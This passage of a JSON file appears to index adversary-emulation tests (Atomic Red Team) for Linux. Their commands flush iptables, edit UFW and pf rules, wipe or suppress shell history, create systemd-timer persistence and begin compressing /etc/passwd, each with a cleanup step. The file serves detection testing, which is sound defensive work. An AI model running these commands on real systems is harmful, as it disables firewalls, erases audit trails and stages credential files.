        "prereq_command": "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Add and delete a rule on the Uncomplicated Firewall (UFW) if installed and enabled. \n",
    "indexed_technique": "T1562.004.05",
    "technique_index": 5,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.004",
    "display_name": "Impair Defenses: Disable or Modify System Firewall",
    "source_file": "T1562.004.yaml",
    "test_name": "Add and delete Packet Filter rules",
    "test_guid": "8b23cae1-66c1-41c5-b79d-e095b6098b5b",
    "description": "Uses `pfctl` to add a rule to an anchor named `pf-rules` that blocks incoming TCP traffic from the IP `1.2.3.4`, then displays the active rules in that anchor.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "echo \"block in proto tcp from 1.2.3.4 to any\" | pfctl -a pf-rules -f -\npfctl -a pf-rules -s rules\n",
      "cleanup_command": "pfctl -a pf-rules -F rules\nsed -i \"\" '/anchor pf-rules/d'\npfctl -f /etc/pf.conf\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if pf is installed on the machine and enabled.\n",
        "prereq_command": "if [ ! -x \"$(command -v pfctl)\" ]; then echo -e \"\\n***** PF NOT installed *****\\n\"; exit 1; fi\nif [ \"$(kldstat -n pf)\" = \"\" ]; then echo -e \"\\n***** PF inactive *****\\n\"; exit 1; fi \n",
        "get_prereq_command": "echo \"anchor pf-rules >> /etc/pf.conf\"\npfctl -f /etc/pf.conf\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Add and delete a rule on the Packet Filter (PF) if installed and enabled. \n",
    "indexed_technique": "T1562.004.06",
    "technique_index": 6,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.004",
    "display_name": "Impair Defenses: Disable or Modify System Firewall",
    "source_file": "T1562.004.yaml",
    "test_name": "Edit UFW firewall user.rules file",
    "test_guid": "beaf815a-c883-4194-97e9-fdbbb2bbdd7c",
    "description": "Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules (Adds a comment to the file).",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/user.rules\ngrep \"# THIS IS A COMMENT\" /etc/ufw/user.rules\n",
      "cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/user.rules\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if /etc/ufw/user.rules exists.\n",
        "prereq_command": "if [ ! -f \"/etc/ufw/user.rules\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules.\n",
    "indexed_technique": "T1562.004.07",
    "technique_index": 7,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.004",
    "display_name": "Impair Defenses: Disable or Modify System Firewall",
    "source_file": "T1562.004.yaml",
    "test_name": "Edit UFW firewall ufw.conf file",
    "test_guid": "c1d8c4eb-88da-4927-ae97-c7c25893803b",
    "description": "Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf (adds a comment to the file).",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/ufw.conf\ngrep \"# THIS IS A COMMENT\" /etc/ufw/ufw.conf\n",
      "cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/ufw.conf\ncat /etc/ufw/ufw.conf\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if /etc/ufw/ufw.conf exists.\n",
        "prereq_command": "if [ ! -f \"/etc/ufw/ufw.conf\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf \nwhich controls if the firewall starts on boot and its logging level.\n",
    "indexed_technique": "T1562.004.08",
    "technique_index": 8,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.004",
    "display_name": "Impair Defenses: Disable or Modify System Firewall",
    "source_file": "T1562.004.yaml",
    "test_name": "Edit UFW firewall sysctl.conf file",
    "test_guid": "c4ae0701-88d3-4cd8-8bce-4801ed9f97e4",
    "description": "Edit the Uncomplicated Firewall (UFW) configuration file for setting network \nvariables /etc/ufw/sysctl.conf (Adds a comment to the file).",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/sysctl.conf\ngrep \"# THIS IS A COMMENT\" /etc/ufw/sysctl.conf\n",
      "cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/sysctl.conf\ncat /etc/ufw/sysctl.conf\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if /etc/ufw/sysctl.conf exists.\n",
        "prereq_command": "if [ ! -f \"/etc/ufw/sysctl.conf\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Edit the Uncomplicated Firewall (UFW) configuration file for setting network \nvariables /etc/ufw/sysctl.conf.\n",
    "indexed_technique": "T1562.004.09",
    "technique_index": 9,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.004",
    "display_name": "Impair Defenses: Disable or Modify System Firewall",
    "source_file": "T1562.004.yaml",
    "test_name": "Edit UFW firewall main configuration file",
    "test_guid": "7b697ece-8270-46b5-bbc7-6b9e27081831",
    "description": "Edit the Uncomplicated Firewall (UFW) main configuration file for setting \ndefault policies /etc/default/ufw (Adds a comment to the file).",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "echo \"# THIS IS A COMMENT\" >> /etc/default/ufw\ngrep \"# THIS IS A COMMENT\" /etc/default/ufw\n",
      "cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/default/ufw\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if /etc/default/ufw exists.\n",
        "prereq_command": "if [ ! -f \"/etc/default/ufw\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Edit the Uncomplicated Firewall (UFW) main configuration file for setting \ndefault policies /etc/default/ufw.\n",
    "indexed_technique": "T1562.004.10",
    "technique_index": 10,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.004",
    "display_name": "Impair Defenses: Disable or Modify System Firewall",
    "source_file": "T1562.004.yaml",
    "test_name": "Tail the UFW firewall log file",
    "test_guid": "419cca0c-fa52-4572-b0d7-bc7c6f388a27",
    "description": "Print  the last 10 lines of the Uncomplicated Firewall (UFW) log file \n/var/log/ufw.log.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "tail /var/log/ufw.log\n",
      "cleanup_command": ""
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if /var/log/ufw.log exists.\n",
        "prereq_command": "if [ ! -f \"/var/log/ufw.log\" ]; then echo -e \"\\n***** ufw NOT logging *****\\n\"; exit 1; fi\n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Print  the last 10 lines of the Uncomplicated Firewall (UFW) log file \n/var/log/ufw.log.\n",
    "indexed_technique": "T1562.004.11",
    "technique_index": 11,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.004",
    "display_name": "Impair Defenses: Disable or Modify System Firewall",
    "source_file": "T1562.004.yaml",
    "test_name": "Disable iptables",
    "test_guid": "7784c64e-ed0b-4b65-bf63-c86db229fd56",
    "description": "This test saves current iptables rules to /tmp/iptables.rules and flushes all rules to disable iptables.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "iptables-save > /tmp/iptables.rules\niptables -F\n",
      "cleanup_command": "iptables-restore < /tmp/iptables.rules\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if iptables is installed on the machine.\n",
        "prereq_command": "if [ ! -x \"$(command -v iptables)\" ]; then echo -e \"\\n***** iptables NOT installed *****\\n\"; exit 1; fi\n",
        "get_prereq_command": "sudo apt-get install iptables\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Some Linux systems may not activate ufw, but use iptables for firewall rules instead. (ufw works on top of iptables.) \nAttackers cannot directly disable iptables, as it is not implemented as a service like ufw. But they can flush all iptables \nrules, which in fact \"disable\" iptables. \n",
    "indexed_technique": "T1562.004.12",
    "technique_index": 12,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.004",
    "display_name": "Impair Defenses: Disable or Modify System Firewall",
    "source_file": "T1562.004.yaml",
    "test_name": "Modify/delete iptables firewall rules",
    "test_guid": "899a7fb5-d197-4951-8614-f19ac4a73ad4",
    "description": "This test deletes an iptables rule that blocks outbound FTP traffic on port 21.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "iptables -D OUTPUT -p tcp --dport 21 -j DROP\n",
      "cleanup_command": "iptables-restore < /tmp/iptables.rules\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if iptables is installed on the machine.\n",
        "prereq_command": "if [ ! -x \"$(command -v iptables)\" ]; then echo -e \"\\n***** iptables NOT installed *****\\n\"; exit 1; fi\nif ! echo \"$(iptables -L)\" | grep -q \"DROP .*dpt:ftp\"; then echo -e \"\\n***** this firewall rule is NOT activated *****\\n***** activate it by executing \\\"iptables -A OUTPUT -p tcp --dport 21 -j DROP\\\" *****\\n\"; exit 1; fi\n",
        "get_prereq_command": "iptables-save > /tmp/iptables.rules\nif echo \"$(iptables -L)\" | grep -q \"DROP .*dpt:ftp\"; then echo \"Rule found\"; else echo \"Rule not found. Setting it...\"; iptables -A OUTPUT -p tcp --dport 21 -j DROP; fi\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Instead of completely \"disabling\" iptables, adversaries may choose to delete a certain rule, which, for example, blocks data exfiltration via ftp.\nBy doing so, they may cause less noise to avoid detection. \n",
    "indexed_technique": "T1562.004.13",
    "technique_index": 13,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.003",
    "display_name": "Impair Defenses: Impair Command History Logging",
    "source_file": "T1562.003.yaml",
    "test_name": "Disable history collection",
    "test_guid": "4eafdb45-0f79-4d66-aa86-a3e2c08791f5",
    "description": "Disables history collection in shells\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "export HISTCONTROL=ignoreboth\n#{evil_command}\n",
      "name": "sh"
    },
    "input_arguments": {
      "evil_command": {
        "description": "Command to run after shell history collection is disabled",
        "type": "string",
        "default": "whoami"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Disables history collection in shells\n",
    "indexed_technique": "T1562.003.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.003",
    "display_name": "Impair Defenses: Impair Command History Logging",
    "source_file": "T1562.003.yaml",
    "test_name": "Clear bash history",
    "test_guid": "878794f7-c511-4199-a950-8c28b3ed8e5b",
    "description": "Clear the bash history cache and the history file as their last act before logging off to remove the record of their command line activities. \n\nIn this test we use the $HISTFILE variable throughout to 1. confirms the $HISTFILE variable is set 2. echo \"\" into it 3..5 confirm the file is empty 6 clear the history cache 7. confirm the history cache is empty.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": false,
      "command": "cp $HISTFILE $HISTFILE.OLD\nif ((${#HISTFILE[@]})); then echo $HISTFILE; fi\necho \"\" > $HISTFILE\nif [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \"$HISTFILE is larger than 1k\"; fi\nls -la $HISTFILE \ncat $HISTFILE\nhistory -c \nif [ $(history |wc -l) -eq 1 ]; then echo \"History cache cleared\"; fi\n",
      "cleanup_command": "mv -f $HISTFILE.OLD $HISTFILE \n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An attacker may clear the bash history cache and the history file as their last act before logging off to remove the record of their command line activities. \n\nIn this test we use the $HISTFILE variable throughout to 1. confirms the $HISTFILE variable is set 2. echo \"\" into it 3..5 confirm the file is empty 6 clear the history cache 7. confirm the history cache is empty. This is when the attacker would logoff.\n",
    "indexed_technique": "T1562.003.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.003",
    "display_name": "Impair Defenses: Impair Command History Logging",
    "source_file": "T1562.003.yaml",
    "test_name": "Setting the HISTCONTROL environment variable",
    "test_guid": "10ab786a-028e-4465-96f6-9e83ca6c5f24",
    "description": "Exploit the space before a command (e.g. \" ls\") or the duplicate command suppression feature in Bash history to prevent their commands from being recorded in the history file or to obscure the order of commands used. \n\nIn this test we 1. sets $HISTCONTROL to ignoreboth 2. clears the history cache 3. executes ls -la with a space in-front of it 4. confirms that ls -la is not in the history cache 5. sets $HISTCONTROL to erasedups 6. clears the history cache 7..9 executes ls -la $HISTFILE 3 times 10. confirms that their is only one command in history\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": false,
      "command": "TEST=$(echo $HISTCONTROL)\nif [ \"$HISTCONTROL\" != \"ignoreboth\" ]; then export HISTCONTROL=\"ignoreboth\"; fi\nhistory -c \nls -la $HISTFILE # \" ls -la $HISTFILE\"\nif [ $(history |wc -l) -eq 1 ]; then echo \"ls -la is not in history cache\"; fi\nif [ \"$HISTCONTROL\" != \"erasedups\" ]; then export HISTCONTROL=\"erasedups\"; fi\nhistory -c \nls -la $HISTFILE\nls -la $HISTFILE\nls -la $HISTFILE\nif [ $(history |wc -l) -eq 2 ]; then echo \"Their is only one entry for ls -la $HISTFILE\"; fi\n",
      "cleanup_command": "export HISTCONTROL=$(echo $TEST)\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An attacker may exploit the space before a command (e.g. \" ls\") or the duplicate command suppression feature in Bash history to prevent their commands from being recorded in the history file or to obscure the order of commands used. \n\nIn this test we 1. sets $HISTCONTROL to ignoreboth 2. clears the history cache 3. executes ls -la with a space in-front of it 4. confirms that ls -la is not in the history cache 5. sets $HISTCONTROL to erasedups 6. clears the history cache 7..9 executes ls -la $HISTFILE 3 times 10. confirms that their is only one command in history\n",
    "indexed_technique": "T1562.003.03",
    "technique_index": 3,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.003",
    "display_name": "Impair Defenses: Impair Command History Logging",
    "source_file": "T1562.003.yaml",
    "test_name": "Setting the HISTFILESIZE environment variable",
    "test_guid": "5cafd6c1-2f43-46eb-ac47-a5301ba0a618",
    "description": "Set the bash history files size environment variable (HISTFILESIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILESIZE. In this test we 1. echo HISTFILESIZE 2. set it to zero 3. confirm that HISTFILESIZE is set to zero.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": false,
      "command": "TEST=$(echo $HISTFILESIZE)\necho $HISTFILESIZE\nexport HISTFILESIZE=0\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT\";  fi\n",
      "cleanup_command": "export HISTCONTROL=$(echo $TEST)\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An Adversary may set the bash history files size environment variable (HISTFILESIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILESIZE. In this test we 1. echo HISTFILESIZE 2. set it to zero 3. confirm that HISTFILESIZE is set to zero.\n",
    "indexed_technique": "T1562.003.04",
    "technique_index": 4,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.003",
    "display_name": "Impair Defenses: Impair Command History Logging",
    "source_file": "T1562.003.yaml",
    "test_name": "Setting the HISTSIZE environment variable",
    "test_guid": "386d3850-2ce7-4508-b56b-c0558922c814",
    "description": "Set the sh history files size environment variable (HISTSIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTSIZE. In this test we 1. echo HISTSIZE 2. set it to zero 3. confirm that HISTSIZE is set to zero.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "echo $HISTSIZE\nexport HISTSIZE=0\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTSIZE) -eq 0 ]; then echo \"\\$HISTSIZE is zero\"; else HIST_LENGTH=$(wc -l $HISTFILE); echo \"\\$HISTSIZE is not zero, history size is $HIST_LENGTH\";  fi\n",
      "cleanup_command": "export HISTSIZE=100\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An Adversary may set the sh history files size environment variable (HISTSIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTSIZE. In this test we 1. echo HISTSIZE 2. set it to zero 3. confirm that HISTSIZE is set to zero.\n",
    "indexed_technique": "T1562.003.05",
    "technique_index": 5,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.003",
    "display_name": "Impair Defenses: Impair Command History Logging",
    "source_file": "T1562.003.yaml",
    "test_name": "Setting the HISTFILE environment variable",
    "test_guid": "b3dacb6c-a9e3-44ec-bf87-38db60c5cad1",
    "description": "Clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": false,
      "command": "TEST=$(echo $HISTFILE)\necho $HISTFILE\nexport HISTFILE=\"/dev/null\"\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT\";  fi\n",
      "cleanup_command": "export HISTFILE=$(echo $TEST)\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.\n",
    "indexed_technique": "T1562.003.06",
    "technique_index": 6,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.003",
    "display_name": "Impair Defenses: Impair Command History Logging",
    "source_file": "T1562.003.yaml",
    "test_name": "Setting the HISTIGNORE environment variable",
    "test_guid": "f12acddb-7502-4ce6-a146-5b62c59592f1",
    "description": "Take advantage of the HISTIGNORE environment variable either to ignore particular commands or all commands. \n\nIn this test we 1. set HISTIGNORE to ignore ls, rm and ssh commands 2. clear this history cache 3..4 execute ls commands 5. confirm that the ls commands are not in the history cache 6. unset HISTIGNORE variable 7.. same again, but ignoring ALL commands.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": false,
      "command": "if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='ls*:rm*:ssh*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi\nhistory -c \nls -la $HISTFILE\nls -la ~/.bash_logout\nif [ $(history |wc -l) -eq 1 ]; then echo \"ls commands are not in history\"; fi\nunset HISTIGNORE\nif ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi\nhistory -c \nwhoami\ngroups\nif [ $(history |wc -l) -eq 0 ]; then echo \"History cache is empty\"; fi\n",
      "cleanup_command": "unset HISTIGNORE\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An Adversary may take advantage of the HISTIGNORE environment variable either to ignore particular commands or all commands. \n\nIn this test we 1. set HISTIGNORE to ignore ls, rm and ssh commands 2. clear this history cache 3..4 execute ls commands 5. confirm that the ls commands are not in the history cache 6. unset HISTIGNORE variable 7.. same again, but ignoring ALL commands.\n",
    "indexed_technique": "T1562.003.07",
    "technique_index": 7,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1090.001",
    "display_name": "Proxy: Internal Proxy",
    "source_file": "T1090.001.yaml",
    "test_name": "Connection Proxy",
    "test_guid": "0ac21132-4485-4212-a681-349e8a6637cd",
    "description": "Enable traffic redirection. Sets the `http_proxy` environment variable to `127.0.0.1:3128` and then uses `curl` to make a test request to `http://google.com` through that proxy.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "export #{proxy_scheme}_proxy=#{proxy_server}:#{proxy_port}\ncurl #{test_url}\n",
      "cleanup_command": "unset #{proxy_scheme}_proxy\n[ \"#{run_squid}\" == \"true\" ] && (kill -9 $(ps aux | grep \"squid -N\" | grep -v \"grep\" | awk '{print $2}'))\n",
      "name": "sh"
    },
    "input_arguments": {
      "proxy_server": {
        "description": "Proxy server URL",
        "type": "url",
        "default": "127.0.0.1"
      },
      "proxy_port": {
        "description": "Proxy server port",
        "type": "integer",
        "default": 3128
      },
      "proxy_scheme": {
        "description": "Protocol to proxy (http or https)",
        "type": "string",
        "default": "http"
      },
      "test_url": {
        "description": "URL to test proxy connection",
        "type": "string",
        "default": "http://google.com"
      },
      "run_squid": {
        "description": "If set to true, the test will install and configure a proxy server on the endpoint.\nNote that this test may conflict with pre-existing system configuration.\n",
        "type": "string",
        "default": "false"
      }
    },
    "dependencies": [
      {
        "description": "Squid must be installed and running",
        "prereq_command": "if ([ \"#{run_squid}\" = \"false\" ] || ([ -x \"$(command -v squid --version)\" ] && (ps aux | grep \"squid -N\" | grep -v \"grep\"))); then exit 0; else exit 1; fi;",
        "get_prereq_command": "[ \"#{run_squid}\" = \"true\" ] && ([ -x \"$(command -v squid --version)\" ] || sudo DEBIAN_FRONTEND=noninteractive apt-get -y install squid curl || sudo yum install -y squid curl || sudo dnf install -y squid curl || brew install curl squid) && (squid -N -d 1 &) && exit 0\necho \"Value #{run_squid} for variable \"run_squid\" is not valid\" && exit 1"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Enable traffic redirection.\n\nNote that this test may conflict with pre-existing system configuration.\n",
    "indexed_technique": "T1090.001.01",
    "technique_index": 1,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1053.006",
    "display_name": "Scheduled Task/Job: Systemd Timers",
    "source_file": "T1053.006.yaml",
    "test_name": "Create Systemd Service and Timer",
    "test_guid": "f4983098-bb13-44fb-9b2c-46149961807b",
    "description": "This test creates Systemd service and timer then starts and enables the Systemd timer \n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "echo \"[Unit]\" > #{path_to_systemd_service}\necho \"Description=Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_service}\necho \"[Service]\" >> #{path_to_systemd_service}\necho \"Type=simple\" >> #{path_to_systemd_service}\necho \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> #{path_to_systemd_service}\necho \"[Install]\" >> #{path_to_systemd_service}\necho \"WantedBy=multi-user.target\" >> #{path_to_systemd_service}\necho \"[Unit]\" > #{path_to_systemd_timer}\necho \"Description=Executes Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_timer}\necho \"Requires=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"[Timer]\" >> #{path_to_systemd_timer}\necho \"Unit=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"OnCalendar=*-*-* *:*:00\" >> #{path_to_systemd_timer}\necho \"[Install]\" >> #{path_to_systemd_timer}\necho \"WantedBy=timers.target\" >> #{path_to_systemd_timer}\nsystemctl start #{systemd_timer_name}\nsystemctl enable #{systemd_timer_name}\nsystemctl daemon-reload\n",
      "cleanup_command": "systemctl stop #{systemd_timer_name}\nsystemctl disable #{systemd_timer_name}\nrm #{path_to_systemd_service}\nrm #{path_to_systemd_timer}\nsystemctl daemon-reload\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "path_to_systemd_service": {
        "description": "Path to systemd service unit file",
        "type": "path",
        "default": "/etc/systemd/system/art-timer.service"
      },
      "path_to_systemd_timer": {
        "description": "Path to service timer file",
        "type": "path",
        "default": "/etc/systemd/system/art-timer.timer"
      },
      "systemd_service_name": {
        "description": "Name of systemd service",
        "type": "string",
        "default": "art-timer.service"
      },
      "systemd_timer_name": {
        "description": "Name of systemd service timer",
        "type": "string",
        "default": "art-timer.timer"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test creates Systemd service and timer then starts and enables the Systemd timer \n",
    "indexed_technique": "T1053.006.01",
    "technique_index": 1,
    "categories": [
      "privilege-escalation",
      "execution",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1053.006",
    "display_name": "Scheduled Task/Job: Systemd Timers",
    "source_file": "T1053.006.yaml",
    "test_name": "Create a user level transient systemd service and timer",
    "test_guid": "3de33f5b-62e5-4e63-a2a0-6fd8808c80ec",
    "description": "This test creates a user-level transient systemd service and timer using systemd-run to log the date and user every minute to /tmp/log.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": false,
      "command": "systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n",
      "cleanup_command": "systemctl --user stop Atomic-Red-Team.service\nsystemctl --user stop Atomic-Red-Team.timer\nrm /tmp/log\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if systemd-run exists on the machine\n",
        "prereq_command": "if [ -x \"$(command -v systemd-run)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "echo \"Install systemd on the machine.\"; exit 1;\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Schedule a user level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n",
    "indexed_technique": "T1053.006.02",
    "technique_index": 2,
    "categories": [
      "privilege-escalation",
      "execution",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1053.006",
    "display_name": "Scheduled Task/Job: Systemd Timers",
    "source_file": "T1053.006.yaml",
    "test_name": "Create a system level transient systemd service and timer",
    "test_guid": "d3eda496-1fc0-49e9-aff5-3bec5da9fa22",
    "description": "This test creates a system-level transient systemd service and timer using systemd-run to log the date and user every minute to /tmp/log.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": true,
      "command": "systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n",
      "cleanup_command": "systemctl stop Atomic-Red-Team.service\nsystemctl stop Atomic-Red-Team.timer\nrm /tmp/log\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if systemd-run exists on the machine\n",
        "prereq_command": "if [ -x \"$(command -v systemd-run)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "echo \"Install systemd on the machine.\"; exit 1;\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Schedule a system level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n",
    "indexed_technique": "T1053.006.03",
    "technique_index": 3,
    "categories": [
      "privilege-escalation",
      "execution",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1560.002",
    "display_name": "Archive Collected Data: Archive via Library",
    "source_file": "T1560.002.yaml",
    "test_name": "Compressing data using GZip in Python (FreeBSD/Linux)",
    "test_guid": "391f5298-b12d-4636-8482-35d9c17d53a8",
    "description": "This test uses Python's gzip module to compress /etc/passwd into /tmp/passwd.gz with compression level 6.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "which_python=`which python || which python3`\n$which_python -c \"import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();\"\n",
      "cleanup_command": "rm #{path_to_output_file}\n"
    },
    "input_arguments": {
      "path_to_input_file": {
